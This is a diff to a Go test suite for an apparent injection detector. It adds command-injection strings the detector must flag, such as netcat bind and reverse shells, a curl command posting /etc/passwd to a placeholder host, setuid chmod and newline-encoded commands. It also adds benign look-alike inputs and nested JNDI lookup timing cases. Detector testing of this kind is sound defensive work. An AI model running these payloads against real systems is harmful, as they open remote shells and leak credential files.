@@ -81,6 +81,22 @@ func TestCmdIPositives(t *testing.T) {
 		"& cmd /c whoami",
 		"& dir /s",
 		"; powershell -nop -c iex",
+		"; nc -n -v -l -p 4444 -e /bin/sh",
+		"; nc -lvnp 4444",
+		"; nc -lvp 4444",
+		"| nc -l -p 4444",
+		"; ncat -e sh 10.0.0.1",
+		"&& curl -X POST -d @/etc/passwd http://x",
+		"; ping -c 3 -i 1 -W 1 -s 64 10.0.0.1",
+		"; cat -- /etc/passwd",
+		"; chmod +x m",
+		"; chmod 777 /tmp/m",
+		"; chmod u+s m",
+		"%0aid",
+		"%0aid%0a",
+		"x%0awhoami",
+		"x%0als%0a",
+		"x%0D%0Aid",
 		"a; /usr/bin/id",
 		"& DIR C:\\",
 		"; uname -a",
@@ -133,6 +149,16 @@ func TestCmdINegatives(t *testing.T) {
 		"Notes:\nid\nThanks",
 		"Upper Dir / Lower Dir",
 		"Sizes & type -- S, M, L",
+		"Shirt size -L size",
+		"T-shirt & cat -L size",
+		"Mug | cat -XL",
+		"Tea & cat -lovers mug",
+		"Cat litter; cat -5 kg off",
+		"Delivery & ping -Ali at gate",
+		"House 12\nNear Main Bazar\nDir Upper\nPhone 0300-1234567",
+		"Tea & ls -lovers mug",
+		"Notes; chmod later",
+		"Call me | nc -sorry 12 hours",
 	})
 }
 
@@ -335,10 +361,10 @@ func TestJNDILargePayloadTime(t *testing.T) {
 	for _, size := range []int{64 << 10, 1 << 20} {
 		payload := strings.Repeat("a", size)
 		for _, depth := range []int{maxLookupDepth, 1000} {
-			for _, open := range []string{"${lower:", "${x:-"} {
+			for _, open := range []string{"${lower:", "${upper:", "${x:-", "${::-"} {
 				in := strings.Repeat(open, depth) + payload + strings.Repeat("}", depth)
-				if d := bestOf(3, func() { JNDI(in) }); d > raceSlowdown*5*time.Millisecond {
-					t.Errorf("JNDI(%q x %d around %d bytes): %v, want under %v", open, depth, size, d, raceSlowdown*5*time.Millisecond)
+				if d := bestOf(3, func() { JNDI(in) }); d > raceSlowdown*10*time.Millisecond {
+					t.Errorf("JNDI(%q x %d around %d bytes): %v, want under %v", open, depth, size, d, raceSlowdown*10*time.Millisecond)
 				}
 			}
 		}
